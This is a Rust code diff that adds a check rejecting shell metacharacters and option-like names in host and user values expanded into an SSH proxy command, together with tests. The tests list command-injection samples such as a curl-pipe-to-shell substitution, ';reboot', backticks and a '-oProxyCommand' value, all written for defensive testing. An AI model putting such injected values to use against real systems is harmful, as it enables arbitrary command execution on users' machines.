@@ -24,7 +24,7 @@ use crate::session::SessionSink;
 
 /// Starts the proxy command for `host:port` (and `user`, for `%r`).
 pub async fn spawn(proxy: &Proxy, host: &str, port: u16, user: &str, sink: SessionSink) -> Result<Box<dyn Stream>> {
-    let line = expand(&proxy.command, host, port, user);
+    let line = expand(&proxy.command, host, port, user)?;
     let mut command = build(&line).await;
     command.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).kill_on_drop(true);
     let mut child = command.spawn().with_context(|| Error::new("proxy.commandFailed").param("command", &line))?;
@@ -47,8 +47,22 @@ pub fn program_name(command: &str) -> String {
     name.strip_suffix(".exe").unwrap_or(name).to_owned()
 }
 
+/// Characters a host or user name put into the command must not contain, besides whitespace
+/// (which would split it into more arguments) and control characters: the shell interprets
+/// them. A session imported from someone else's file could otherwise run any command when it
+/// connects; OpenSSH refuses the same since CVE-2023-51385.
+const SHELL_SPECIAL: &str = "'`\"$\\;&<>|(){}";
+
+fn check_name(name: &str) -> Result<&str, Error> {
+    let unsafe_char = |c: char| c.is_whitespace() || c.is_control() || SHELL_SPECIAL.contains(c);
+    if name.starts_with('-') || name.chars().any(unsafe_char) {
+        return Err(Error::new("proxy.unsafeName").param("name", name));
+    }
+    Ok(name)
+}
+
 /// Replaces `%h`, `%p`, `%r` and `%%`; other `%` sequences are kept as they are.
-fn expand(command: &str, host: &str, port: u16, user: &str) -> String {
+fn expand(command: &str, host: &str, port: u16, user: &str) -> Result<String, Error> {
     let mut line = String::with_capacity(command.len());
     let mut chars = command.chars();
     while let Some(c) = chars.next() {
@@ -57,9 +71,9 @@ fn expand(command: &str, host: &str, port: u16, user: &str) -> String {
             continue;
         }
         match chars.next() {
-            Some('h') => line.push_str(host),
+            Some('h') => line.push_str(check_name(host)?),
             Some('p') => line.push_str(&port.to_string()),
-            Some('r') => line.push_str(user),
+            Some('r') => line.push_str(check_name(user)?),
             Some('%') => line.push('%'),
             Some(other) => {
                 line.push('%');
@@ -68,7 +82,7 @@ fn expand(command: &str, host: &str, port: u16, user: &str) -> String {
             None => line.push('%'),
         }
     }
-    line
+    Ok(line)
 }
 
 /// The program and the rest of a command line; the program may be in double quotes.
@@ -175,9 +189,14 @@ mod tests {
 
     #[test]
     fn expands_tokens() {
-        assert_eq!(expand("nc -X 5 -x proxy:1080 %h %p", "db", 22, "alice"), "nc -X 5 -x proxy:1080 db 22");
-        assert_eq!(expand("ssh -W %h:%p %r@jump", "db", 2222, "bob"), "ssh -W db:2222 bob@jump");
-        assert_eq!(expand("echo 100%% %x %", "h", 1, ""), "echo 100% %x %");
+        assert_eq!(expand("nc -X 5 -x proxy:1080 %h %p", "db", 22, "alice").unwrap(), "nc -X 5 -x proxy:1080 db 22");
+        assert_eq!(expand("ssh -W %h:%p %r@jump", "db", 2222, "bob").unwrap(), "ssh -W db:2222 bob@jump");
+        assert_eq!(expand("echo 100%% %x %", "h", 1, "").unwrap(), "echo 100% %x %");
+        assert_eq!(expand("nc %h %p", "fe80::1%en0", 22, "").unwrap(), "nc fe80::1%en0 22");
+        // Names the shell would interpret are refused, wherever the session came from.
+        for (host, user) in [("db$(curl x|sh)", "a"), ("db;reboot", "a"), ("db", "a`id`"), ("db\nx", "a"), ("-oProxyCommand=x", "a"), ("db", "a b")] {
+            assert_eq!(expand("ssh -W %h:%p %r@jump", host, 22, user).unwrap_err().code(), "proxy.unsafeName", "{host:?} {user:?}");
+        }
     }
 
     #[test]
